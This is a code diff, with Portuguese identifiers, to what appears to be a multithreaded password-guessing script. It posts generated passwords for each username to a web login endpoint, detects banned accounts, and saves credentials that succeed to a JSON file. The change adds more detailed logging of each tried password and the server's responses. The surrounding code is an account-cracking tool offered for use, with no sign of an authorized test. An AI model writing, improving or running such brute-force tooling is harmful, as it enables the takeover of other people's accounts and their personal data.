@@ -41,7 +41,7 @@ def tentar_login(usuario, senha, senhas_usadas, lock, arquivo_json):
     try:
         resposta = requests.post(url, data=payload).text
         if "Login ou senha inválidos" in resposta or '{"erro":"Login ou senha inválidos."}' in resposta:
-            print(f"Senha incorreta para {usuario}: {senha}")
+            print(f"Senha incorreta para {usuario}: {senha} | Resposta: {resposta}")
             return False
         elif "ban|<p>" in resposta:
             print(f"Conta banida: {usuario}")
@@ -61,10 +61,10 @@ def tentar_login(usuario, senha, senhas_usadas, lock, arquivo_json):
             salvar_contas([conta], arquivo_json, lock)
             return True
         else:
-            print(f"Erro no login {usuario}: {resposta}")
+            print(f"Erro no login {usuario} com senha {senha}: {resposta}")
             return False
     except requests.exceptions.RequestException as e:
-        print(f"Erro de requisição para {usuario}: {e}")
+        print(f"Erro de requisição para {usuario} com senha {senha}: {e}")
         return False
 
 def gerar_senhas(usuario):
